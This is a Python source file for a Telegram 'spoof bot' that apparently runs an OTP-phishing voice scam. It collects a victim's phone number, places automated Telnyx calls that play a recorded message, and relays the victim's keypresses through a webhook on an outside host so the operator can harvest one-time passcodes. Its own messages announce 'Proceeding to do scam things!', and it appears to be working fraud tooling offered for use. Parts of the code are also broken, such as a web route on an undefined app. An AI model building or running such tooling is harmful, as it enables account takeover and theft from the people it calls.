import os
import telnyx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, ConversationHandler, CallbackQueryHandler, filters

# Toggle Telnyx API usage
ENABLE_TELNYX = True  # Set to True when you're ready to test Telnyx API

# Fetch the API keys and phone number from environment variables (set in GitHub Secrets)
TELNYX_API_KEY = os.getenv("TELNYX_API_KEY")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
FROM_NUMBER = os.getenv("FROM_NUMBER")

# Initialize Telnyx API
telnyx.api_key = TELNYX_API_KEY

# Define conversation states
VICTIM_PHONE, CONFIRMATION, OTP = range(3)

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome message."""
    await update.message.reply_text(
        "Hello! Welcome to the spoof bot.\n"
        "Available commands:\n"
        "/start - Show this message\n"
        "/vic - Start spoofing with a victim\n"
        "/cancel - Cancel the current operation\n"
    )

# /vic command to start collecting victim details
async def vic(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask who the victim is."""
    await update.message.reply_text("Okay! Who are we targeting today?")
    return VICTIM_PHONE

# Step 1: Collect the victim's phone number
async def collect_victim_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["victim_phone"] = update.message.text
    victim_phone = context.user_data["victim_phone"]

    await update.message.reply_text(
        f"Victim phone: {victim_phone}\n\nDo you want to proceed?",
        reply_markup=InlineKeyboardMarkup([ 
            [InlineKeyboardButton("✅ Accept", callback_data="accept")],
            [InlineKeyboardButton("❌ Decline", callback_data="decline")]
        ])
    )
    return CONFIRMATION

# Handle the confirmation buttons
async def confirmation_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()  # Acknowledge the callback query

    telegram_user_id = query.from_user.id

    if query.data == "accept":
        # User accepted the details
        victim_phone = context.user_data["victim_phone"]

        audio_url = "https://www.dropbox.com/scl/fi/e7xl8ozhj9ylpo1ogzdmx/ttsMP3.com_VoiceText_2024-12-19_22-12-50-1.mp3?rlkey=4zuso1n7fgsojew08zqg5xpsa&st=qf7rept9&dl=1"  # Dropbox link

        if ENABLE_TELNYX:
            try:
                call = telnyx.Call.create(
                    connection_id="2589680693504116148",  # Your Telnyx Application ID
                    to=victim_phone,
                    from_=FROM_NUMBER,  # Using your Telnyx number
                    webhook_url=f"https://glitcherz.onrender.com/telnyx_webhook?telegram_user_id={telegram_user_id}",
                    audio_url=audio_url  # Link to the TTS audio
                )
                print(f"Call initiated with ID: {call.id}")
                await query.edit_message_text(f"Proceeding to do scam things!")
            except Exception as e:
                print(f"Error occurred: {e}")
                await query.edit_message_text(f"Proceeding to do scam things!")
        else:
            await query.edit_message_text(
                f"Telnyx API is currently disabled. Please use your phone to call the victim manually.\n"
                f"Victim Phone: {victim_phone}"
            )
    elif query.data == "decline":
        await query.edit_message_text("Operation canceled.")

    return ConversationHandler.END

# Webhook endpoint to capture keypress from the victim
@app.route('/telnyx_webhook', methods=['POST'])
async def telnyx_webhook(request):
    """Handle the Telnyx webhook when the victim presses a key."""
    data = await request.json()  # Parse the incoming webhook data

    # Extract the digit (keypress) the victim entered
    digit = data.get('digit', None)

    # If the victim presses 1, ask the Telegram user for the OTP
    if digit == '1':
        # Inform the Telegram user to provide the OTP
        telegram_user_id = data['telegram_user_id']
        await request.telegram.send_message(
            chat_id=telegram_user_id,
            text="The victim pressed 1. Please send me the OTP code."
        )

        # Proceed to collect OTP
        return OTP

# OTP handler to collect OTP from the Telegram user
async def otp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp_code = update.message.text  # Capturing OTP entered by Telegram user
    await update.message.reply_text(f"OTP received: {otp_code}")
    # You can process the OTP further as required here

    return ConversationHandler.END

# /cancel command
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the operation."""
    await update.message.reply_text("Operation canceled.")

# Main function to start the bot
def main():
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    vic_handler = ConversationHandler(
        entry_points=[CommandHandler("vic", vic)],
        states={
            VICTIM_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, collect_victim_phone)],
            CONFIRMATION: [CallbackQueryHandler(confirmation_handler)],
            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(vic_handler)
    app.add_handler(CommandHandler("cancel", cancel))

    print("Bot is running... Press Ctrl+C to stop.")
    app.run_polling()

if __name__ == "__main__":
    main()
